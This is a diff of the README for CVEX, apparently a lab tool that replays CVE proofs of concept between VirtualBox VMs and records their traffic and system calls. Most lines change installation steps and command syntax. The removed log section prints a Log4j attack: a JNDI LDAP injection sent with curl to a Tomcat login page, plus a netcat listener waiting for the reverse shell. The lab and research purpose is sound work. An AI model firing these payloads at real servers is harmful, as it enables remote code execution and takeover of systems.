@@ -18,47 +18,30 @@ Tech stack:
 
 ## Installation
 
-### Python
-
-[Install](https://cloudbytes.dev/snippets/upgrade-python-to-latest-version-on-ubuntu-linux) Python 3.10 or higher.
- 
-Then install Python dependencies using Poetry:
-
-```shell
-sudo apt update
-sudo apt install python3-poetry
-poetry install
 ```
-
-And activate a Poetry shell to use the dependencies:
-```shell
-poetry shell
-```
-
-### VirtualBox
-
-While in theory Vagrant should work with any VM provider, CVEX was tested only with VirtualBox. Install VirtualBox this way:
-```
+python3 -m venv venv
+source venv/bin/activate
+pip install -e .
 sudo apt update
 sudo apt install virtualbox virtualbox-ext-pack
 ```
 
+While in theory Vagrant should work with any VM provider, CVEX was tested only with VirtualBox.
+
 ## Run
 
-Execute from the root CVEX folder:
+Always execute CVEX from the root folder:
 ```
-~/CVEX$ python3 -m cvex -c CVE-0000-00001
+~/CVEX$ cvex -c CVE-0000-00001
 ```
 
 CVEX comes with a set of PoC CVEs:
 - [CVE-0000-00000](records/CVE-0000-00000): curl, executed on Windows, downloads a web-page from ngix, running on Ubuntu
-- [CVE-0000-00001](records/CVE-0000-00001): curl, executed on Ubuntu, downloads a web-page from ngix, running on another Ubuntu
-- [CVE-0000-00002](records/CVE-0000-00002): curl, executed on Ubuntu, downloads a web-page from ngix, running on Windows
-- [CVE-0000-00003](records/CVE-0000-00003): curl, executed on Windows, downloads a web-page from ngix, running on another Windows
-- [CVE-2021-44228](records/CVE-2021-44228): Log4j vulnerability with backconnect to remote shell
 
 <details>
+
 <summary>Execution of CVE-0000-00000</summary>
+
 [records/CVE-0000-00000/cvex.yml](records/CVE-0000-00000/cvex.yml) describes the VM infrastructure for this PoC:
 ```
 blueprint: windows10-ubuntu2204
@@ -125,7 +108,7 @@ Full list of parameters of a blueprint:
 
 At first, CVEX pulls the Ubuntu VM from the Vagrant repository and stores the config file of the VM in ~/.cvex/router. This Ubuntu VM will act as a router. It also creates the `clean` snapshot with the initial state of the VM:
 ```
-~/CVEX$ python3 -m cvex -c CVE-0000-00000
+~/CVEX$ cvex -c CVE-0000-00000
 2024-09-13 13:52:30,081 - INFO - [router] Retrieving status of router...
 2024-09-13 13:52:32,820 - INFO - [router] Initializing a new VM router at /home/john/.cvex/router...
 2024-09-13 13:52:33,766 - INFO - [router] Starting the VM router...
@@ -194,7 +177,7 @@ Sometimes VM initialization takes longer than expected:
 
 In this case we need to wait until the VM is up and the OS is aready. For example, use the VirtualBox GUI. As soon as the OS fully loads, re-run CVEX with `-k`. With this parameter CVEX uses the VMs that are already running:
 ```
-$ python3 -m cvex -c CVE-0000-00000 -k
+$ cvex -c CVE-0000-00000 -k
 2024-09-13 14:25:18,880 - INFO - [router] Retrieving status of router...
 2024-09-13 14:25:23,828 - INFO - [router] VM router (192.168.56.2) is already running
 2024-09-13 14:25:26,910 - INFO - [router] Retrieving snapshot list of router...
@@ -410,9 +393,16 @@ Parameter `-o` specifies custom output folder.
 ```
 </details>
 
+- [CVE-0000-00001](records/CVE-0000-00001): curl, executed on Ubuntu, downloads a web-page from ngix, running on another Ubuntu
+- [CVE-0000-00002](records/CVE-0000-00002): curl, executed on Ubuntu, downloads a web-page from ngix, running on Windows
+- [CVE-0000-00003](records/CVE-0000-00003): curl, executed on Windows, downloads a web-page from ngix, running on another Windows
+- [CVE-2021-44228](records/CVE-2021-44228): Log4j vulnerability with backconnect to remote shell
+
 <details>
 <summary>Execution of CVE-2021-44228 and analysis of logs</summary>
+
 [records/CVE-2021-44228/cvex.yml](records/CVE-2021-44228/cvex.yml) describes the VM infrastructure for this CVE:
+
 ```
 blueprint: ubuntu2204-ubuntu2204
 ubuntu1:
@@ -428,45 +418,9 @@ ubuntu2:
     - "sleep 10"
 ```
 
-Ansible playbook `ubuntu1.yml` installs a Tomcat based web application, vulnerable to the Log4j attack. Ansible playbook `ubuntu2.yml` installs a fake LDAP server and a web server that is hosting the payload.
+Ansible playbook `ubuntu1.yml` installs an Apache Tomcat based web application, vulnerable to the Log4j attack. Ansible playbook `ubuntu2.yml` installs a fake LDAP server and a web server that is hosting the payload.
 
-
-Execution of CVE-2021-44228 is no different from any other CVE:
-```
-~/CVEX$ python3 -m cvex -c CVE-2021-44228
-```
-
-The section "Execution of CVE-0000-00000" describes the execution process in details, therefore we will omit it here. Instead, let's focus on analysis of logs produced by CVEX. The IP address of ubuntu1 is 192.168.56.3, the IP address of ubuntu2 is 192.168.56.4:
-```
-2024-10-09 15:27:10,423 - INFO - [ubuntu1] Restoring VM ubuntu1 (192.168.56.3) to snapshot 'clean'...
-...
-2024-10-09 15:30:14,814 - INFO - [ubuntu2] Restoring VM ubuntu2 (192.168.56.4) to snapshot 'clean'...
-
-```
-
-Final stepts of execution:
-```
-024-10-09 15:33:51,063 - INFO - [ubuntu2] Executing 'python3 /tmp/cvex/agent.py "curl|python3|nc|java" /tmp/cvex ubuntu2'...
-2024-10-09 15:33:52,077 - INFO - [ubuntu2] Executing 'strace -o /tmp/cvex/ubuntu2_strace_python3_0.log python3 /opt/log4j-shell-poc/poc.py --userip 192.168.56.4 --webport 9999 --lport 1234'...
-2024-10-09 15:34:03,010 - INFO - [ubuntu2] Executing 'strace -o /tmp/cvex/ubuntu2_strace_nc_1.log nc -nvlp 1234'...
-2024-10-09 15:34:03,127 - INFO - [ubuntu2] Executing 'strace -o /tmp/cvex/ubuntu2_strace_curl_2.log curl -d 'uname=%24%7Bjndi%3Aldap%3A%2F%2F192.168.56.4%3A1389%2Fa%7D&password=' http://ubuntu1:8080/login'...
-2024-10-09 15:34:03,150 - INFO - [ubuntu2] Executing 'sleep 10'...
-2024-10-09 15:34:13,202 - INFO - [ubuntu2] Executing 'pkill python3'...
-2024-10-09 15:34:13,282 - INFO - [ubuntu2] Executing 'sudo pkill strace'...
-2024-10-09 15:34:13,389 - INFO - [ubuntu2] Executing 'ls /tmp/cvex/*strace*.log'...
-2024-10-09 15:34:13,439 - INFO - [ubuntu2] Downloading /tmp/cvex/ubuntu2_strace_curl_2.log...
-2024-10-09 15:34:13,501 - INFO - [ubuntu2] Downloading /tmp/cvex/ubuntu2_strace_curl_4821.log...
-2024-10-09 15:34:13,618 - INFO - [ubuntu2] Downloading /tmp/cvex/ubuntu2_strace_curl_4824.log...
-2024-10-09 15:34:13,642 - INFO - [ubuntu2] Downloading /tmp/cvex/ubuntu2_strace_nc_1.log...
-2024-10-09 15:34:13,672 - INFO - [ubuntu2] Downloading /tmp/cvex/ubuntu2_strace_nc_4817.log...
-2024-10-09 15:34:13,693 - INFO - [ubuntu2] Downloading /tmp/cvex/ubuntu2_strace_nc_4820.log...
-2024-10-09 15:34:13,704 - INFO - [ubuntu2] Downloading /tmp/cvex/ubuntu2_strace_python3_0.log...
-2024-10-09 15:34:13,728 - INFO - [ubuntu2] Downloading /tmp/cvex/ubuntu2_strace_python3_4721.log...
-2024-10-09 15:34:13,867 - INFO - [ubuntu2] Downloading /tmp/cvex/ubuntu2_strace_python3_4724.log...
-2024-10-09 15:34:13,877 - INFO - [router] Wait for 5 seconds to let tcpdump and mitmdump flush logs on disk...
-2024-10-09 15:34:18,884 - INFO - [router] Downloading /tmp/cvex/router_raw.pcap...
-2024-10-09 15:34:18,911 - INFO - [router] Downloading /tmp/cvex/router_mitmdump.stream...
-```
+Section "Execution of CVE-0000-00000" describes the execution process in details, therefore we will omit it here. Instead, let's focus on analysis of logs produced by CVEX. In our logs the IP address of ubuntu1 is 192.168.56.3, the IP address of ubuntu2 is 192.168.56.4.
 
 To inspect the PCAP file, run tcpdump:
 ```
@@ -583,7 +537,7 @@ If something goes wrong and re-starting CVEX doesn't help, run it with the `-v` 
 
 CVEX executed with `-l` parameter shows the list of cached VMs:
 ```
-$ python3 -m cvex -l
+$ cvex -l
 2024-09-19 10:41:45,410 - INFO - [main] Cached VMs:
 2024-09-19 10:41:45,410 - INFO - [main] router
 2024-09-19 10:41:45,410 - INFO - [main] gusztavvargadr_windows-10/2202.0.2404/1
@@ -592,7 +546,7 @@ $ python3 -m cvex -l
 
 CVEX executed with `-d` parameter destroys the specific VM and deletes all corresponding files:
 ```
-$ python3 -m cvex -d gusztavvargadr_windows-10/2202.0.2404/1
+$ cvex -d gusztavvargadr_windows-10/2202.0.2404/1
 2024-09-19 10:45:57,769 - INFO - [stub] Destroying VM stub...
 ```
 
